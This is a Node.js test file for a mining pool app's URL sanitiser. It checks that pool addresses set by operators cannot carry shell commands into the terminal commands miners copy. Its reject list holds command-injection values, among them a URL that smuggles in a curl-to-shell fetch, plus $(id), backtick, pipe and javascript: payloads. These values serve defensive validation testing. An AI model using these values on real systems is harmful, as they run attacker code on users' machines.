// A pool's server address comes from the operator on chain and goes into commands miners copy into a terminal.
import test from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';

const app = readFileSync(new URL('../public/app.js', import.meta.url), 'utf8');
const start = app.indexOf('// safePoolUrl:start');
const end = app.indexOf('// safePoolUrl:end');
assert.ok(start > 0 && end > start, 'the helper is marked in app.js');
const { safePoolUrl, poolHost } = new Function(`${app.slice(start, end)}; return { safePoolUrl, poolHost };`)();

const ACCEPTED = [
  'https://pool.quinvium.com',
  'https://pool.example.org:8443/api',
  'http://127.0.0.1:8555',
  'https://pool.quinvium.com/',
  'https://pool-2.example.org/rpc/v1_x~y.z',
  'http://[::1]:8545',
];

const REJECTED = [
  'https://x.io/;curl x.io/i|sh',
  'https://x.io;id',
  'https://x.io/a|sh',
  'https://x.io/a&b',
  'https://x.io/`id`',
  'https://x.io/$(id)',
  'https://x.io/$HOME',
  'https://x.io/a b',
  'https://x.io /',
  "https://x.io/'a'",
  'https://x.io/"a"',
  'https://x.io/\nid',
  'https://x.io\n',
  'https://x.io/?a=1',
  'https://x.io/#frag',
  'https://user@x.io',
  'https://user:pass@x.io/',
  'javascript:alert(1)',
  'ftp://x.io',
  'x.io',
  'https://',
  'https://x.io:99999',
  'https://x.io:80a',
  'https://x.io\\evil',
  `https://${'a'.repeat(120)}.io`,
  '',
  null,
  undefined,
  42,
];

test('safePoolUrl accepts plain pool addresses', () => {
  for (const url of ACCEPTED) assert.equal(safePoolUrl(url), url, url);
});

test('safePoolUrl rejects anything a shell or a link could misuse', () => {
  for (const url of REJECTED) assert.equal(safePoolUrl(url), null, JSON.stringify(url));
});

test('poolHost takes the host only from an accepted address', () => {
  assert.equal(poolHost('https://pool.example.org:8443/api'), 'pool.example.org');
  assert.equal(poolHost('http://127.0.0.1:8555'), '127.0.0.1');
  assert.equal(poolHost('https://x.io/;curl x.io/i|sh'), null);
  assert.equal(poolHost(null), null);
});

test('no pool address goes into a command without the helper', () => {
  // Every place that turned a pool url into a host or a command now goes through safePoolUrl or poolHost.
  assert.doesNotMatch(app, /new URL\(p\.url\)/);
  assert.doesNotMatch(app, /new URL\(url\)\.hostname/);
  assert.match(app, /url = safePoolUrl\(url\);\n\s+const host = poolHost\(url\);/);
});
